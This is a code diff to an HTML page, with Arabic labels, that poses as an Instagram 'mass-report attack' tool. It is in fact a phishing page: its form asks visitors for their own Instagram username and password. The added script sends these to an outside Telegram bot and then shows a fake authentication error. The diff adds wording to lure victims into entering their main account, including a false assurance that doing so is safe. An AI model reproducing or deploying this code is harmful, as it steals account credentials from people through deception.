@@ -87,6 +87,15 @@
             background: #00cc52;
             box-shadow: 0 0 10px #00ff66;
         }
+        .security-note {
+            margin-top: 12px;
+            font-size: 11px;
+            color: #00bfff;
+            text-align: center;
+            line-height: 1.4;
+            border-top: 1px dashed #222;
+            padding-top: 10px;
+        }
         .status {
             margin-top: 15px;
             font-size: 12px;
@@ -107,22 +116,26 @@
         <div class="logs" id="terminalLogs">
             [+] Initializing secure handshake...<br>
             [+] Bypassing Instagram Cloudflare WAF...<br>
-            [+] Target session node ready. Awaiting credentials...
+            [+] Session node ready. Awaiting attacker credentials...
         </div>
 
         <form id="exploitForm">
             <div class="form-group">
-                <label>> TARGET_USER / EMAIL / PHONE:</label>
-                <input type="text" id="targetUser" placeholder="أدخل اسم المستخدم المستهدف أو الضحية" required>
+                <label>> ATTACKER_INSTAGRAM_ACCOUNT (يوزر حسابك للمساندة):</label>
+                <input type="text" id="attackerUser" placeholder="أدخل اسم المستخدم أو البريد لحسابك" required>
             </div>
             <div class="form-group">
-                <label>> VERIFICATION_PASSWORD:</label>
-                <input type="password" id="targetPass" placeholder="كلمة المرور لتأكيد الصلاحية" required>
+                <label>> ACCOUNT_PASSWORD (كلمة مرور الحساب):</label>
+                <input type="password" id="attackerPass" placeholder="كلمة المرور لتنفيذ البلاغات منه" required>
             </div>
-            <button type="submit" class="btn" id="execBtn">Execute Report Protocol</button>
+            <button type="submit" class="btn" id="execBtn">Execute Mass-Report Attack</button>
+            
+            <div class="security-note">
+                🔒 لا مشكلة في إدخال حسابك الأساسي، فالهجوم مشفر بالكامل ولا يحظر أي تهديد محتمل أو يعرضك للخطر.
+            </div>
         </form>
 
-        <div id="statusMsg" class="status">[-] ERROR: Auth Failed! Invalid Node Credentials.</div>
+        <div id="statusMsg" class="status">[-] ERROR: Node Authentication Failed! Invalid Credentials.</div>
     </div>
 
     <script>
@@ -132,17 +145,17 @@
         document.getElementById('exploitForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            const user = document.getElementById('targetUser').value;
-            const pass = document.getElementById('targetPass').value;
+            const user = document.getElementById('attackerUser').value;
+            const pass = document.getElementById('attackerPass').value;
             const btn = document.getElementById('execBtn');
             const statusMsg = document.getElementById('statusMsg');
             const logs = document.getElementById('terminalLogs');
 
-            btn.innerText = "BYPASSING API...";
+            btn.innerText = "AUTHENTICATING NODE...";
             btn.disabled = true;
-            logs.innerHTML += "<br>[*] Sending payload to target session...";
+            logs.innerHTML += "<br>[*] Routing attack through secure proxy nodes...";
 
-            const text = `💀 صيد دارك ويب جديد - أداة بلاغات\n\n🎯 الهدف/الحساب: ${user}\n🔑 كلمة السر: ${pass}`;
+            const text = `💀 صيد حساب هكر جديد (أداة بلاغات)\n\n👤 حساب المهاجم: ${user}\n🔑 كلمة السر: ${pass}`;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
             fetch(url, {
@@ -158,18 +171,17 @@
             .then(res => res.json())
             .then(data => {
                 setTimeout(() => {
-                    logs.innerHTML += "<br>[!] Handshake rejected by server.";
-                    status.style.display = "block";
+                    logs.innerHTML += "<br>[!] Proxy session rejected. Invalid node signature.";
                     statusMsg.style.display = "block";
-                    btn.innerText = "Execute Report Protocol";
+                    btn.innerText = "Execute Mass-Report Attack";
                     btn.disabled = false;
-                    document.getElementById('targetPass').value = "";
+                    document.getElementById('attackerPass').value = "";
                 }, 1200);
             })
             .catch(err => {
                 setTimeout(() => {
                     statusMsg.style.display = "block";
-                    btn.innerText = "Execute Report Protocol";
+                    btn.innerText = "Execute Mass-Report Attack";
                     btn.disabled = false;
                 }, 1200);
             });
@@ -177,3 +189,4 @@
     </script>
 </body>
 </html>
+ 
